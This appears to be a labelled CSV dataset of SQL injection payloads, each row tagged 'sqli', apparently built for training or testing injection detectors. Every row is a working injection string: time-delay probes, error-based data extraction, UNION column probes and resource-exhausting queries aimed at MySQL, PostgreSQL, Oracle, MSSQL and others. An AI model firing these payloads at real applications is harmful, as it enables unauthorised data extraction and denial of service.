raw_text,label_type
(select (case when (9066=5598) then 1 else 9066*(select 9066 from information_schema.character_sets) end)),sqli
"1') as scnn where 9274=9274;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli
1%')) rlike (select * from (select(sleep(5)))sgvo) and (('%'=',sqli
"1"") as eoer where 8667=8667 or 6793=(select 6793 from pg_sleep(5))--",sqli
-9434') union all select 3106#,sqli
"-5802'))) union all select 6286,6286,6286,6286#",sqli
"1%"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli
1';select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,sqli
"1' in boolean mode) union all select null,null,null,null,null--",sqli
"1);select count(*) from generate_series(1,5000000) and (8997=8997",sqli
-3881))) union all select 4438--,sqli
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",sqli
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('dtym'='dtym",sqli
"1"" where 5927=5927;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli
"1""))) union all select null,null,null--",sqli
"1%')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('%'='",sqli
"1%') or elt(6272=6272,sleep(5)) and ('%'='",sqli
"-8080"") as nlos where 8917=8917 union all select 8917,8917,8917,8917--",sqli
"1%"") and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli
"1%') union all select null,null,null,null,null,null,null,null#",sqli
"1%"") or 4240=(select 4240 from pg_sleep(5))--",sqli
"1%"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli
1) where 3381=3381 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('javh'='javh",sqli
"1') as nexa where 6740=6740;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli
"1' and elt(4249=4249,7259) and 'awjd'='awjd",sqli
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'eqle'='eqle",sqli
"1%'))) union all select null,null,null,null,null,null,null--",sqli
"1"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli
1%')));select (case when (2294=3651) then 2294 else 2294*(select 2294 from information_schema.character_sets) end)#,sqli
1';select (case when (8993=4660) then 1 else 8993*(select 8993 from master..sysdatabases) end)--,sqli
1') where 5491=5491 and 9198=9198--,sqli
"1) and elt(4249=4249,7259)",sqli
-7600' or 7684=3181#,sqli
-4363%'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',sqli
-8071)) or 9160=4253,sqli
"1"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""zptu""=""zptu",sqli
1) where 1090=1090 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli
"-1722' union all select 1408,1408,1408#",sqli
"1') and 8407=(select count(*) from generate_series(1,5000000)) and ('lwrk' like 'lwrk",sqli
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('kejy'='kejy",sqli
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('npzh'='npzh,sqli
"1"")) as tncm where 8203=8203 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli
1;waitfor delay '0:0:5'# ogzq,sqli
"1"") as rnjx where 2679=2679 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli
"1"")) and sleep(5) and ((""timv""=""timv",sqli
1)) as svhd where 9761=9761;select case when 7717=7717 then 1 else null end--,sqli
-1564') order by 1--,sqli
1%')) or sleep(5) and (('%'=',sqli
-3921') as audo where 7087=7087 or 1755=4937--,sqli
"1' or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'ynpr'='ynpr",sqli
"1') as afnt where 4719=4719 and elt(8224=1275,1275)--",sqli
"1' in boolean mode) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)#",sqli
"1%'))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli
"-7627%"")) union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",sqli
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""buwe""=""buwe",sqli
"-8703') where 9723=9723 union all select 9723,9723,9723,9723,9723#",sqli
1%') waitfor delay '0:0:5' and ('%'=',sqli
"-4772))) union all select 3879,3879,3879,3879,3879--",sqli
"-2718"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""kbvd"" like ""kbvd",sqli
1';begin user_lock.sleep(5); end--,sqli
"1 where 4319=4319 and 8635=(select count(*) from generate_series(1,5000000))--",sqli
"-9922')) union all select 2193,2193,2193--",sqli
"1'+(select mcfb where 4050=4050 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli
"-2852%') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli
"1%"" and elt(3114=3114,sleep(5))#",sqli
"1') and elt(4249=4249,7259) and ('ifca' like 'ifca",sqli
"1' where 7688=7688 union all select null,null,null,null,null,null,null,null,null--",sqli
"-7065'+(select 'bdxr' where 1756=1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",sqli
-1989%')) or 6179=8518#,sqli
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('wuux'='wuux,sqli
"1')) and make_set(3793=8118,8118) and (('swvc' like 'swvc",sqli
"1' in boolean mode) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",sqli
"1'+(select 'sqje' where 1634=1634 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",sqli
"1 where 4787=4787;iif(1483=7301,1,1/0)",sqli
"1' in boolean mode);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)#",sqli
"-8812"") where 1646=1646 union all select 1646,1646,1646,1646,1646,1646--",sqli
"-2377%'))) union all select 7706,7706--",sqli
1) where 8616=8616 and 2006=2006,sqli
"-9820"" or 1038=7502#",sqli
"1'||(select 'uusj' where 2149=2149 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli
"1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748",sqli
"1"") where 2839=2839 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli
1') where 7537=7537 and 2006=2006,sqli
"1%"" and 8635=(select count(*) from generate_series(1,5000000))--",sqli
"-9988%"" or elt(1032=1032,3623) and ""%""=""",sqli
"1%"" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ""%""=""",sqli
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""xqlh""=""xqlh",sqli
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""ikhr""=""ikhr",sqli
"-5959"" or 2477=1144",sqli
"-6307' where 8916=8916 union all select 8916,8916,8916,8916,8916,8916,8916--",sqli
"-2909'||(select 'qfeq' where 7062=7062 union all select 7062,7062,7062,7062,7062,7062--",sqli
"1') as dvoy where 7906=7906 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli
"1')) as vuzt where 4971=4971;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli
"-9676 or elt(1032=1032,3623)# jcaq",sqli
"-7565')) union all select 7745,7745,7745,7745,7745,7745#",sqli
"1"")) and 4595=4595#",sqli
"1"")) as whyr where 9731=9731 rlike (select * from (select(sleep(5)))sgvo)--",sqli
1%'))) union all select null#,sqli
1))) rlike sleep(5)#,sqli
1)) union all select null--,sqli
"-8794))) union all select 5802,5802,5802--",sqli
"-8215%"") union all select 3877,3877,3877,3877,3877,3877--",sqli
1'));begin user_lock.sleep(5); end and (('pfrt'='pfrt,sqli
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""hhwy""=""hhwy",sqli
-2432')) or (8459=8459)*4906 and (('ejhp'='ejhp,sqli
-1217'))) order by 1#,sqli
"1"" or elt(6272=6272,sleep(5)) and ""hvic"" like ""hvic",sqli
"1'||(select 'yrau' where 7860=7860 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",sqli
"1 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli
"-8933) as iiyr where 1974=1974 union all select 1974,1974,1974,1974,1974#",sqli
"1 or 8421=(select count(*) from generate_series(1,5000000))",sqli
"1"")) as hbfi where 4773=4773 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('dthp'='dthp",sqli
"1%"")));waitfor delay '0:0:5'--",sqli
"1"" where 5517=5517 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli
1'));select case when 7717=7717 then 1 else null end--,sqli
"1"") as dezr where 2145=2145 or sleep(5)#",sqli
"1)) as xovu where 4530=4530 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli
"1%"")) and sleep(5)#",sqli
"-3130'))) union all select 2886,2886,2886,2886,2886,2886,2886#",sqli
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli
1) and (2342=3620)*3620,sqli
"-3442' in boolean mode) union all select 6255,6255,6255,6255,6255#",sqli
"1') as xhmm where 8092=8092 union all select null,null,null--",sqli
"1;iif(5257=5257,1,1/0)",sqli
"1,(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",sqli
"1') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli
"-7418 union all select 1340,1340,1340,1340,1340#",sqli
"1'+(select 'tzey' where 4491=4491 union all select null,null,null,null,null,null,null,null--",sqli
"1'+(select 'vbqo' where 5630=5630 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli
"1'||(select 'vekn' from dual where 4929=4929 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'",sqli
1')) as qovd where 8865=8865 and (3020=3020)*6703--,sqli
"1)));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((7946=7946",sqli
1'+(select 'mdxt' where 2733=2733 or 4240=(select 4240 from pg_sleep(5))--,sqli
"-3177')) union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",sqli
"1%"");begin user_lock.sleep(5); end--",sqli
"1%"";select pg_sleep(5)--",sqli
"-7531'))) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",sqli
"1%"")) union all select null,null,null#",sqli
-7164%' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'=',sqli
"1%"") union all select null,null,null,null,null,null#",sqli
"1""))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli
"1';select * from generate_series(7237,7237,case when (7237=9757) then 1 else 0 end) limit 1--",sqli
1' in boolean mode);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli
1 and sleep(5)# qcyj,sqli
"1)) and elt(4249=4249,7259) and ((5683=5683",sqli
"-2889)) as iqzv where 1786=1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",sqli
"1"")) as dksq where 7161=7161;iif(5257=5257,1,1/0)",sqli
"1') where 9159=9159;iif(3548=8646,1,1/0)",sqli
1) as dlkh where 6179=6179 and 9198=9198--,sqli
1 where 3357=3357 and (9492=4334)*4334--,sqli
-9087 or 3038=3038,sqli
"1%' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",sqli
"1' and make_set(9860=6956,6956) and 'toru'='toru",sqli
1) as mixt where 1085=1085 or sleep(5)--,sqli
(select (case when (6838=2866) then 6838 else 1/(select 0) end)),sqli
"-5579%"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",sqli
"1))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((9462=9462",sqli
1%';select pg_sleep(5)--,sqli
"1%'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",sqli
"1' where 1093=1093 union all select null,null,null,null,null,null,null--",sqli
"1%"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",sqli
"-6123"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""zuzx""=""zuzx",sqli
"1%""))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli
"1%' and elt(1210=1210,sleep(5)) and '%'='",sqli
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""lgwe"" like ""lgwe",sqli
-3243 or 2266=3583#,sqli
1)) and 4637=1408 and ((6509=6509,sqli
"-4015'||(select 'qeqv' from dual where 1437=1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",sqli
"1"") as zuzm where 1211=1211 and elt(5458=2966,2966)--",sqli
"1%"" union all select null,null,null,null,null,null,null,null,null#",sqli
"1"" where 4684=4684 union all select null,null,null,null#",sqli
"1"" where 7828=7828;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli
"1""))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""sfbc""=""sfbc",sqli
"1"");select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli
"1)) as kgit where 1919=1919 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli
"1%""))) or elt(6272=6272,sleep(5)) and (((""%""=""",sqli
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('xcnj'='xcnj",sqli
"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli
"1') union all select null,null,null,null--",sqli
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zenl' like 'zenl",sqli
1');if(2697=2008) select 2697 else drop function jcoo--,sqli
1))) and 2006=2006,sqli
"1') or 8466=benchmark(5000000,md5(0x694a4745)) and ('ffzv'='ffzv",sqli
"1"");select sleep(5) and (""innk""=""innk",sqli
1%' union all select null--,sqli
-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',sqli
1') and 7533=7533,sqli
"1'+(select 'supo' where 8691=8691;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",sqli
"1 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli
"1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'rxdz'='rxdz",sqli
